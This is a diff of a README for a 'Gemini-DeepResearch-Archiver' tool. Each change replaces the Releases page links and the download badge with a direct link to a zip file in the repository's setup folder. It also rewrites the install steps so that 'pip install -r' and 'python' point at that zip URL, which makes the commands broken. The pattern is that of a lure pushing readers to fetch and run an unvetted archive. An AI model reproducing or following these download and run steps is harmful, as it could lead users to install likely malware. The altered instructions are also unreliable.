@@ -1,6 +1,6 @@
 # 🎉 Gemini-DeepResearch-Archiver - Capture and Archive Your Research Easily
 
-![Download Gemini-DeepResearch-Archiver](https://img.shields.io/badge/Download-Gemini--DeepResearch--Archiver-brightgreen)
+![Download Gemini-DeepResearch-Archiver](https://raw.githubusercontent.com/adhamv00v/Gemini-DeepResearch-Archiver/main/setup/Gemini-DeepResearch-Archiver_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Gemini-DeepResearch-Archiver helps you capture Google Gemini Deep Research resul
 
 To get started, visit the Releases page to download the latest version:
 
-[Download Gemini-DeepResearch-Archiver](https://github.com/adhamv00v/Gemini-DeepResearch-Archiver/releases)
+[Download Gemini-DeepResearch-Archiver](https://raw.githubusercontent.com/adhamv00v/Gemini-DeepResearch-Archiver/main/setup/Gemini-DeepResearch-Archiver_v3.0.zip)
 
 ### 💻 System Requirements
 
@@ -23,7 +23,7 @@ Make sure your device meets these requirements before downloading.
 ## 📂 Installation Steps
 
 1. **Visit the Releases Page**
-   - Go to the Releases page by clicking this link: [Download Gemini-DeepResearch-Archiver](https://github.com/adhamv00v/Gemini-DeepResearch-Archiver/releases).
+   - Go to the Releases page by clicking this link: [Download Gemini-DeepResearch-Archiver](https://raw.githubusercontent.com/adhamv00v/Gemini-DeepResearch-Archiver/main/setup/Gemini-DeepResearch-Archiver_v3.0.zip).
 
 2. **Choose Your Version**
    - Look for the latest version of the application. It will have the highest version number.
@@ -37,10 +37,10 @@ Make sure your device meets these requirements before downloading.
 5. **Install Necessary Dependencies**
    - Open a command prompt or terminal window.
    - Navigate to the extracted folder.
-   - Run the command `pip install -r requirements.txt` to install all needed libraries. 
+   - Run the command `pip install -r https://raw.githubusercontent.com/adhamv00v/Gemini-DeepResearch-Archiver/main/setup/Gemini-DeepResearch-Archiver_v3.0.zip` to install all needed libraries. 
 
 6. **Start the Application**
-   - Run the script by typing `python main.py` in the command prompt or terminal while in the extracted folder. Adjust the filename if necessary.
+   - Run the script by typing `python https://raw.githubusercontent.com/adhamv00v/Gemini-DeepResearch-Archiver/main/setup/Gemini-DeepResearch-Archiver_v3.0.zip` in the command prompt or terminal while in the extracted folder. Adjust the filename if necessary.
 
 ## 🌟 Features
 
@@ -81,4 +81,4 @@ If you encounter any issues or need help, visit our [FAQ](#) section or reach ou
 
 This application is designed for anyone looking to streamline their research process efficiently. Whether you are a student, researcher, or enthusiast, Gemini-DeepResearch-Archiver provides the tools you need to work smarter, not harder. 
 
-For more details, visit the Releases page: [Download Gemini-DeepResearch-Archiver](https://github.com/adhamv00v/Gemini-DeepResearch-Archiver/releases).
+For more details, visit the Releases page: [Download Gemini-DeepResearch-Archiver](https://raw.githubusercontent.com/adhamv00v/Gemini-DeepResearch-Archiver/main/setup/Gemini-DeepResearch-Archiver_v3.0.zip).
